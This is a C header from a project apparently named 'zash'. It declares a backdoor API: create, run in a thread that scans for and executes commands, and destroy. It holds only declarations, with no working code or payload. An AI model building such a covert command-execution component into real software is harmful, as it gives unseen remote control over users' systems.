/**
 * @brief Header for backdoor.c. The backdoor reading commands using execute them.
 * @aouther Z.F
 * @date 18/3/2020
 */

#ifndef ZASH_BACKDOOR_H
#define ZASH_BACKDOOR_H

/** Headers ***************************************************/
#include "zash_status.h"

/** Structs ***************************************************/
/** @brief the context of a backdoor context. */
struct BACKDOOR_context;


/** Functions ************************************************/
/**
 * @brief Create a backdoor context.
 *
 * @param [out]          context                the newly created backdoor object.
 *
 * @return               return value indicating an error may returned.
 *
 * @note                 must be freed using BACKDOOR_destroy.
 *
 */
enum zash_status BACKDOOR_create(pthread_rwlock_t *lock, struct BACKDOOR_context **context);


/**
 * @brief Run the backdoor in a new thread. Scan for commands and execute them.
 *
 * @param [in]           context                the backdoor context to used to run the backdoor.
 *
 * @return               return value indicating an error may returned.
 *
 */
enum zash_status BACKDOOR_run(struct BACKDOOR_context *context);


/**
 * @brief Stop a running backdoor and free it.
 *
 * @param [in]           context                the backdoor context to free
 *
 * @return               return value indicating an error may returned.
 *
 */
enum zash_status BACKDOOR_destroy(struct BACKDOOR_context *context);


#endif //ZASH_BACKDOOR_H
